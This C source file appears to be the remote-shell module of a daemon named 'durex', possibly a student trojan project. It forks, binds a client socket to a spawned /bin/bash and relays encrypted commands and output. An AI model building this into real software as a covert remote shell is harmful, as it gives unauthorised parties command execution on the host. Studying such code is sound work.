#include "durex.h"

extern t_daemon		g_durex;

/*
** ***********************************************************************
** NAME
**		shell_sigchld_handler
**
** DESCRIPTION
**		Catch the SIGCHLD signal when a remote shell dies.
**		It makes visible the client corresponding to the PID for the
**		master select(2).
**
** ***********************************************************************
*/

void	shell_sigchld_handler(int sig)
{
	pid_t		pid;
	int			status;
	t_client	*clt;

	(void)sig;
	daemon_report(LOG_DEBUG, "Sigchld handler triggered");
	if ((pid = waitpid(-1, &status, 0)) != -1)
	{
		clt = g_durex.clt;
		while (clt != NULL)
		{
			if (clt->pid == pid)
			{
				daemon_report(LOG_SIGNAL, "SIGCHLD signal caught. Killing remote shell.");
				clt->shell = FALSE;
				clt->pid = -1;
				return ;
			}
			clt = clt->next;
		}
	}
}

/*
** ***********************************************************************
** NAME
**		shell_master
**
** DESCRIPTION
**		Set up the two-way pipe for the remote shell.
**
** ***********************************************************************
*/

void	shell_master(t_client *client)
{
	pid_t		pid_fork;
	pid_t		pid_pipe;
	int			pipe_in[2];
	int			pipe_out[2];
	int			status;

	/*
	** Set up SIGCHLD handler
	*/
	if (signal(SIGCHLD, shell_sigchld_handler) == SIG_ERR)
		daemon_report(LOG_ERROR, "Unable to set SIGCHLD signal handler.");
	else
		daemon_report(LOG_DEBUG, "SIGCHLD signal handler set.");

	/*
	** The first fork is to set up the socket as the new standard I/O for the pipe
	*/
	daemon_report(LOG_DEBUG, "Forking main process for socket duplication...");
	pid_fork = fork();

	client->shell = TRUE;
	client->pid = pid_fork;

	/*
	** Fork failed we need to stop routine
	*/
	if (pid_fork < 0)
	{
		daemon_report(LOG_ERROR, "Unable to fork.");
		client->shell = FALSE;
		return ;
	}

	/*
	** Tell the parent not to wait for its child otherwise it will block the
	** server
	*/
	else if (pid_fork > 0)
		waitpid(pid_fork, &status, WNOHANG);

	/*
	** Let's create our pipes !
	*/
	else
	{
		/*
		** Replace standards I/O by the socket
		*/
		daemon_report(LOG_DEBUG, "Replacing standard I/O by socket fd...");
		dup2(client->sock, STDIN_FILENO);
		dup2(client->sock, STDOUT_FILENO);
		dup2(client->sock, STDERR_FILENO);
		close(client->sock);

		/*
		** Create the pipe in
		*/
		daemon_report(LOG_DEBUG, "Creating 1/2 of the two-way pipes...");
		if (pipe(pipe_in) == -1)
		{
			daemon_report(LOG_ERROR, "Unable to create pipe.");
			exit(EXIT_FAILURE);
		}
		else
			daemon_report(LOG_DEBUG, "Pipe created.");

		/*
		** Create the pipe out
		*/
		daemon_report(LOG_DEBUG, "Creating 2/2 of the two-way pipes...");
		if (pipe(pipe_out) == -1)
		{
			daemon_report(LOG_ERROR, "Unable to create pipe.");
			exit(EXIT_FAILURE);
		}
		else
			daemon_report(LOG_DEBUG, "Pipe created.");

		/*
		** The second fork is used to build a two-way pipe communication
		*/
		daemon_report(LOG_DEBUG, "Re-forking main process for pipe communication...");
		pid_pipe = fork();
		if (pid_pipe < 0)
		{
			daemon_report(LOG_ERROR, "Unable to fork.");
			exit(EXIT_FAILURE);
		}
		else if (pid_pipe > 0)
		{
		  shell_parent(pipe_out, pipe_in, client);
		}
		else
		{
			shell_child(pipe_in, pipe_out);
		}
		exit(EXIT_SUCCESS);
	}
}

/*
** ***********************************************************************
** NAME
**		shell_parent
**
** DESCRIPTION
**		Handle the two-way pipe between the dup2(2)-ed socket and the
**		remote shell.
**
** ***********************************************************************
*/

void	shell_parent(int pipe_in[], int pipe_out[], t_client *client)
{
	fd_set		readfs;
	int			maxsock = 0;
	char		buf[4096] = { '\0' };
	int			ret = 0;
	char		*clear = NULL;
	char		*safe = NULL;

	/*
	** Close unused pipe ends
	*/
	close(pipe_in[1]);
	close(pipe_out[0]);

	/*
	** Setup the maximum socket fd for select
	*/
	maxsock = (pipe_in[0] > 0) ? pipe_in[0] : 0;
	while (1)
	{
		/*
		** Clear out readfs
		*/
		FD_ZERO(&readfs);

		/*
		** Add stdin + read end of pipe
		*/
		FD_SET(0, &readfs);
		FD_SET(pipe_in[0], &readfs);

		/*
		** Poll descriptors
		*/
		if (select(maxsock + 1, &readfs, NULL, NULL, NULL) < 0)
			continue ;

		/*
		** Check if socket passed over a message
		*/
		if (FD_ISSET(0, &readfs))
		{
			/*
			** Read message
			*/
			ret = read(0, buf, 1025);
			if (ret == 0)
				break ;

			/*
			** Log and send message through pipe
			*/
			else if (ret > 0)
			  {
			    buf[ret] = '\0';
			    clear = rijn_build_decrypt(client->sched, (unsigned char *)buf);
			    daemon_report(LOG_SHELL, clear);
			    write(pipe_out[1], clear, ret);

			    /* '\n' to trigger bash */
			    write(pipe_out[1], "\n", 1);
			    if (clear)
			      free(clear);
			    clear = NULL;
			  }
		}

		/*
		** Check if shell sent a response
		*/
		else if (FD_ISSET(pipe_in[0], &readfs))
		{
			/*
			** Read message
			*/
			ret = read(pipe_in[0], buf, 1023);
			if (ret == 0)
				break ;

			/*
			** Send message back through pipe
			*/
			else if (ret > 0)
			{
				buf[ret] = '\0';
				safe = rijn_build_encrypt(client->sched, (unsigned char *)buf);

				write(1, safe, ret + 16 - ret%16 + 1);

				/* usleep() in order to noto mix up the messages */
				usleep(50000);
				if (safe)
				  free(safe);
				safe = NULL;
			}
		}
	}

	/*
	** Close remaining unsed pipe ends
	*/
	close(pipe_in[0]);
	close(pipe_out[1]);

	/*
	** Say goodnight !
	*/
	exit(EXIT_SUCCESS);
}

/*
** ***********************************************************************
** NAME
**		shell_child
**
** DESCRIPTION
**		Receives and execute remote shell commands in /bin/sh via the
**		two-way pipe !
**
** ***********************************************************************
*/

void	shell_child(int pipe_in[], int pipe_out[])
{
	char	*args[] = { "/bin/sh", NULL };

	/*
	** Close unused pipe ends
	*/
	close(pipe_in[1]);
	close(pipe_out[0]);

	/*
	** Set the pipe as input/output for shell
	*/
	dup2(pipe_in[0], 0);
	dup2(pipe_out[1], 1);

	/*
	** Close fd duplicates
	*/
	close(pipe_in[0]);
	close(pipe_out[1]);

	/*
	** Spawn shell
	*/
	execv("/bin/bash", args);

	/*
	** Close everything else
	*/
	close(0);
	close(1);

	/*
	** Say goodnight !
	*/
	exit(EXIT_SUCCESS);
}
